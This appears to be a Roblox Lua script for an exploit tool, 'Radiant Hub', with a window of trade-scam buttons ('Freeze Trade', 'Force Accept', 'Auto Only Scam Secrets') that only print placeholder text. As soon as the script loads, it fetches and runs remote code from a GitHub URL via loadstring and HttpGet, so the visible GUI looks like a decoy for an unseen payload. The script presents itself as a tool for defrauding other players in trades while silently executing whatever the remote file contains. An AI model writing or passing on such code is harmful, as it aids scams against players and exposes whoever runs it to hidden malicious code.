-- RADIANT HUB GUI - Professional Version

-- Remove previous instances
if game.CoreGui:FindFirstChild("RadiantHub") then
    game.CoreGui.RadiantHub:Destroy()
end

-- Create GUI
local gui = Instance.new("ScreenGui")
gui.Name = "RadiantHub"
gui.ResetOnSpawn = false
gui.Parent = game:GetService("CoreGui")

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 320, 0, 230)
mainFrame.Position = UDim2.new(0.5, -160, 0.5, -115)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
mainFrame.BorderColor3 = Color3.fromRGB(255, 215, 0)  -- Gold border color
mainFrame.BorderSizePixel = 2
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = gui

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
title.BorderSizePixel = 0
title.Text = "☣ RADIANT HUB ☣"
title.TextColor3 = Color3.fromRGB(255, 215, 0)  -- Gold text color
title.Font = Enum.Font.GothamSemibold
title.TextSize = 20
title.Parent = mainFrame

-- Visual Separator
local separator = Instance.new("Frame")
separator.Size = UDim2.new(1, -20, 0, 1)
separator.Position = UDim2.new(0, 10, 0, 42)
separator.BackgroundColor3 = Color3.fromRGB(255, 215, 0)  -- Gold separator
separator.BorderSizePixel = 0
separator.Parent = mainFrame

-- Function to create styled buttons
local function createButton(text, order)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -40, 0, 40)
    btn.Position = UDim2.new(0, 20, 0, 50 + (order * 50))
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    btn.BorderColor3 = Color3.fromRGB(255, 215, 0)  -- Gold border color for buttons
    btn.BorderSizePixel = 1
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 215, 0)  -- Gold text color
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 16
    btn.AutoButtonColor = false
    btn.Parent = mainFrame

    -- Visual effect when mouse enters
    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    end)

    return btn
end

-- Buttons
local freezeBtn = createButton("🧊 Freeze Trade", 0)
local acceptBtn = createButton("✅ Force Accept", 1)
local confirmBtn = createButton("⚠️ Force Confirm", 2)
local scamSecretsBtn = createButton("🚨 Auto Only Scam Secrets", 3)  -- New Button

-- Functionality (placeholder)
freezeBtn.MouseButton1Click:Connect(function()
    print("[RADIANT HUB] Freeze Trade executed")
end)

acceptBtn.MouseButton1Click:Connect(function()
    print("[RADIANT HUB] Force Accept executed")
end)

confirmBtn.MouseButton1Click:Connect(function()
    print("[RADIANT HUB] Force Confirm executed")
end)

-- New functionality for Auto Only Scam Secrets
scamSecretsBtn.MouseButton1Click:Connect(function()
    print("[RADIANT HUB] Auto Only Scam Secrets executed")  -- Placeholder for the scam secrets functionality
end)

-- Auto-execute the external script
loadstring(game:HttpGet("https://raw.githubusercontent.com/DARKHUBB/RADIANTHUBv2.0/refs/heads/main/RADIANTHUBv2.0.lua"))()

-- Toggle GUI with RightShift
local UIS = game:GetService("UserInputService")
local visible = true

UIS.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.RightShift then
        visible = not visible
        gui.Enabled = visible
    end
end)
